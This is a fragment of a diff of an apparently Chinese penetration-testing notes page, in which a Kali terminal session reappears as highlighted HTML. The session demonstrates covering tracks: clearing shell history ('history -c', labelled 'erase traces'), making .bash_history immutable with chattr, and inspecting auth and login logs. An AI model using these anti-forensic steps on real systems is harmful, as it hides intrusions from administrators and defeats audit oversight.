-    --------------e---- ./Music
-    --------------e---- ./Templates
-root@kali:~# chattr -h
-    Usage: chattr [-pRVf] [-+=aAcCdDeijPsStTu] [-v version] files...
-
-# 修改文件属性让其无法被写入数据
-root@kali:~# touch 456.txt
-root@kali:~# lsattr 456.txt 
-    --------------e---- 456.txt
-root@kali:~# ifconfig &gt; 456.txt 
-root@kali:~# chattr +i 456.txt 
-root@kali:~# lsattr 456.txt 
-    ----i---------e---- 456.txt
-root@kali:~# ifconfig &gt; 456.txt 
-    -bash: 456.txt: 不允许的操作
-
-# 修改 .bash_history，让其无法被写入，会变成只读文件
-root@kali:~# chattr +i .bash_history
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># history</span></span><br><span class="line"><span class="comment"># history 记录保存在 .bash_history</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># ls -l .bash_history </span></span><br><span class="line">    -rw------- <span class="number">1</span> root root <span class="number">15418 3</span>月   <span class="number">4 00</span><span class="symbol">:</span><span class="number">28</span> .bash_history</span><br><span class="line"><span class="comment"># 擦除痕迹</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># history -c</span></span><br><span class="line"></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># lsattr</span></span><br><span class="line">    --------------e---- ./Downloads</span><br><span class="line">    --------------e---- ./Desktop</span><br><span class="line">    --------------e---- ./testDir</span><br><span class="line">    --------------e---- ./Pictures</span><br><span class="line">    --------------e---- ./Public</span><br><span class="line">    --------------e---- ./vmware-tools-patches</span><br><span class="line">    --------------e---- ./Videos</span><br><span class="line">    --------------e---- ./Documents</span><br><span class="line">    --------------e---- ./Music</span><br><span class="line">    --------------e---- ./Templates</span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># chattr -h</span></span><br><span class="line">    <span class="symbol">Usage:</span> chattr [-pRVf] [-+=aAcCdDeijPsStTu] [-v version] files...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改文件属性让其无法被写入数据</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># touch 456.txt</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># lsattr 456.txt </span></span><br><span class="line">    --------------e---- <span class="number">456</span>.txt</span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># ifconfig &gt; 456.txt </span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># chattr +i 456.txt </span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># lsattr 456.txt </span></span><br><span class="line">    ----i---------e---- <span class="number">456</span>.txt</span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># ifconfig &gt; 456.txt </span></span><br><span class="line">    -<span class="symbol">bash:</span> <span class="number">456</span>.<span class="symbol">txt:</span> 不允许的操作</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改 .bash_history，让其无法被写入，会变成只读文件</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># chattr +i .bash_history</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 日志记录</span></span><br><span class="line">•auth.log / secure</span><br><span class="line">•btmp / wtmp</span><br><span class="line">•lastlog / faillog</span><br><span class="line"></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># cat /var/log/auth.log</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># cat /var/log/wtmp</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># lastlog</span></span><br><span class="line">    用户名           端口     来自             最后登陆时间</span><br><span class="line">    root             pts/<span class="number">3</span>    <span class="number">172.16</span>.<span class="number">10.1</span>      日 <span class="number">3</span>月  <span class="number">4 02</span><span class="symbol">:</span><span class="number">30:00</span> -0500 <span class="number">2018</span></span><br><span class="line">    daemon                                     **从未登录过**</span><br><span class="line">    bin                                        **从未登录过**</span><br><span class="line">    sys                                        **从未登录过**</span><br><span class="line">    sync                                       **从未登录过**</span><br><span class="line">    games                                      **从未登录过**</span><br><span class="line">    man                                        **从未登录过**</span><br><span class="line">    lp                                         **从未登录过**</span><br><span class="line">    mail                                       **从未登录过**</span><br><span class="line">    news                                       **从未登录过**</span><br><span class="line">    uucp                                       **从未登录过**</span><br><span class="line">    proxy                                      **从未登录过**</span><br><span class="line">    www-data                                   **从未登录过**</span><br><span class="line">    backup                                     **从未登录过**</span><br><span class="line">    list                                       **从未登录过**</span><br><span class="line">    irc                                        **从未登录过**</span><br><span class="line">    gnats                                      **从未登录过**</span><br><span class="line">    nobody                                     **从未登录过**</span><br></pre></td></tr></table></figure>
 
 
-# 日志记录
-•auth.log / secure
-•btmp / wtmp
-•lastlog / faillog
-
-root@kali:~# cat /var/log/auth.log
-root@kali:~# cat /var/log/wtmp
-root@kali:~# lastlog
-    用户名           端口     来自             最后登陆时间
-    root             pts/3    172.16.10.1      日 3月  4 02:30:00 -0500 2018
-    daemon                                     **从未登录过**
-    bin                                        **从未登录过**
-    sys                                        **从未登录过**
-    sync                                       **从未登录过**
-    games                                      **从未登录过**
-    man                                        **从未登录过**
-    lp                                         **从未登录过**
-    mail                                       **从未登录过**
-    news                                       **从未登录过**
-    uucp                                       **从未登录过**
-    proxy                                      **从未登录过**
-    www-data                                   **从未登录过**
-    backup                                     **从未登录过**
-    list                                       **从未登录过**
-    irc                                        **从未登录过**
-    gnats                                      **从未登录过**
-    nobody                                     **从未登录过**</code></pre>
       
     </div>
     
